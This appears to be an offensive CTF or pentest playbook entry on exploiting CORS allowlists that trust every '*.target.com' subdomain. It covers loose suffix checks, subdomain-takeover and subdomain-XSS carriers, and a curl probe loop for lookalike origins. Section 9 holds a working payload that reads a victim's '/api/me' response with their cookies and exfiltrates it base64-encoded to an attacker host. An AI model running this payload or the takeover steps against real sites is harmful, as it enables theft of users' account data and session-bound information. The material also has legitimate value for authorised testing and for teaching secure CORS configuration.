# Subdomain bypass — the `*.target.com` trust surface

A CORS allowlist that trusts `*.target.com` opens every subdomain —
a subdomain-XSS, a dangling-CNAME takeover, or a sibling app is the
carrier.

---

## 1. The allowlist shapes that open subdomains

```python
# the checks that trust a suffix or wildcard:
if origin.endswith('.target.com'): allow(origin)
if host.endswith('target.com'): allow(origin)      # includes eviltarget.com!
if re.match(r'https?://.*\.target\.com', origin): allow(origin)
CORS_ALLOW_ORIGIN_REGEX = r'.*\.target\.com'        # a Django regex
allowed = ['*.target.com']                          # a wildcard entry
```

## 2. The subdomain carriers — how you get a `*.target.com` page

```text
1. a subdomain-XSS — any XSS on any *.target.com page → a
   controlled origin that passes the allowlist
2. a subdomain-takeover — a dangling CNAME (a deleted S3/GH-Pages/
   Heroku/Azure subdomain) → claim it → a controlled *.target.com
3. a sibling app — another service on a subdomain the challenge ships
4. a shared-hosting subdomain — a *.target.com you provision
5. a user-content subdomain — a pages/blog service on *.target.com
   that lets you host content (a github.io-style subdomain)
```

## 3. The subdomain-takeover — the dangling-CNAME

```bash
# find subdomains pointing at deprovisioned services
dig CNAME sub.target.com       → sub.target.com CNAME deleted.s3.amazonaws.com
dig NXDOMAIN deleted.s3.amazonaws.com
# the CNAME points at a service you can claim → register it → you
# own sub.target.com → a valid Origin under the allowlist
```

## 4. The subdomain-XSS — a sibling-context carrier

```text
an XSS on any *.target.com page — even an unrelated app — gives you
a controlled origin under the wildcard. the CORS read fires from
the sibling's origin.
```

## 5. The `host.endswith('target.com')` trap — a loose check

```text
the check: host.endswith('target.com')  — NO leading dot!
→ 'eviltarget.com' ends with 'target.com' → passes
→ 'xtarget.com' passes
a correct check needs '.target.com' (the dot) to exclude lookalikes.
```

## 6. The "the subdomain is itself CORS-open" — a sibling app

```text
a sibling app on api.target.com / cdn.target.com that's ALSO CORS-
open or hosts user content — a page you control on a sibling origin
reads the parent-domain response.
```

## 7. The cross-subdomain cookie — the credential reaches

```text
a cookie with Domain=.target.com attaches to ALL subdomains —
your subdomain page's fetch to target.com carries the session cookie
(if SameSite allows). the wildcard+CORS+shared-cookie is the chain.
```

## 8. The probe — test the allowlist's subdomain behavior

```bash
for o in 'https://evil.target.com' 'https://eviltarget.com' \
         'https://xtarget.com' 'https://target.com.evil.com'; do
  echo "=== $o ==="
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin'
done
```

## 9. The subdomain→delivery composite

```html
<!-- a page on a subdomain you control -->
<script>
fetch('https://target.com/api/me',{credentials:'include'})
  .then(r=>r.json()).then(d=>
    fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

The subdomain page's fetch passes the `*.target.com` allowlist —
the read lands.

## 10. The falsifier

```text
the allowlist is an exact-match or names specific subdomains only
(no wildcard/suffix) AND no lookalike passes AND no subdomain you
control exists — the subdomain carrier is closed.
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "subdomain-bypass: *.target.com allowlist -> subdomain-XSS/takeover read"
```
